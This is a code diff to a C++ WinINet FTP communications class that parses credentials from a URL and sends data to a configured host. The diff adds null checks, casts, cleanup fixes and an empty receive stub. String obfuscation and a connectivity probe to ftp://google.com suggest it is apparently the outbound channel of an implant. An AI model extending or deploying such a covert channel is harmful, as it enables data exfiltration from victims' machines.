@@ -12,7 +12,7 @@
 #pragma comment(lib, "wininet.lib")
 
 // Obfuscated strings
-constexpr auto OBF_FTP_COMMS = OBFUSCATE("FtpComms");
+static const auto OBF_FTP_COMMS = OBFUSCATE("FtpComms");
 
 FtpComms::FtpComms(Configuration* config)
     : m_config(config), m_hInternet(NULL), m_hConnect(NULL) {}
@@ -41,9 +41,11 @@ bool FtpComms::Initialize() {
     URL_COMPONENTSA urlComp;
     ZeroMemory(&urlComp, sizeof(urlComp));
     urlComp.dwStructSize = sizeof(urlComp);
-    urlComp.dwSchemeLength = -1;
-    urlComp.dwHostNameLength = -1;
-    urlComp.dwUrlPathLength = -1;
+    urlComp.dwSchemeLength = (DWORD)-1;
+    urlComp.dwHostNameLength = (DWORD)-1;
+    urlComp.dwUrlPathLength = (DWORD)-1;
+    urlComp.dwUserNameLength = (DWORD)-1;
+    urlComp.dwPasswordLength = (DWORD)-1;
 
     if (!InternetCrackUrlA(url.c_str(), static_cast<DWORD>(url.length()), 0, &urlComp)) {
         LOG_ERROR("Failed to parse FTP URL: " + std::to_string(GetLastError()));
@@ -51,9 +53,19 @@ bool FtpComms::Initialize() {
     }
 
     std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
-    std::string userName(urlComp.lpszUserName, urlComp.dwUserNameLength);
-    std::string password(urlComp.lpszPassword, urlComp.dwPasswordLength);
-    std::string path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
+    std::string userName, password, path;
+    
+    if (urlComp.lpszUserName && urlComp.dwUserNameLength > 0) {
+        userName = std::string(urlComp.lpszUserName, urlComp.dwUserNameLength);
+    }
+    
+    if (urlComp.lpszPassword && urlComp.dwPasswordLength > 0) {
+        password = std::string(urlComp.lpszPassword, urlComp.dwPasswordLength);
+    }
+    
+    if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0) {
+        path = std::string(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
+    }
 
     // Establish FTP connection
     m_hConnect = InternetConnectA(
@@ -125,11 +137,14 @@ bool FtpComms::SendData(const std::vector<uint8_t>& data) {
 }
 
 void FtpComms::Cleanup() {
-    if (m_hConnect) InternetCloseHandle(m_hConnect);
-    if (m_hInternet) InternetCloseHandle(m_hInternet);
-    
-    m_hConnect = NULL;
-    m_hInternet = NULL;
+    if (m_hConnect) {
+        InternetCloseHandle(m_hConnect);
+        m_hConnect = NULL;
+    }
+    if (m_hInternet) {
+        InternetCloseHandle(m_hInternet);
+        m_hInternet = NULL;
+    }
     
     LOG_DEBUG("FTP communication cleaned up");
 }
@@ -137,4 +152,9 @@ void FtpComms::Cleanup() {
 bool FtpComms::TestConnection() const {
     // Simple FTP connection test
     return InternetCheckConnectionA("ftp://google.com", FLAG_ICC_FORCE_CONNECTION, 0);
+}
+
+std::vector<uint8_t> FtpComms::ReceiveData() {
+    // Implement FTP data reception if needed
+    return std::vector<uint8_t>();
 }
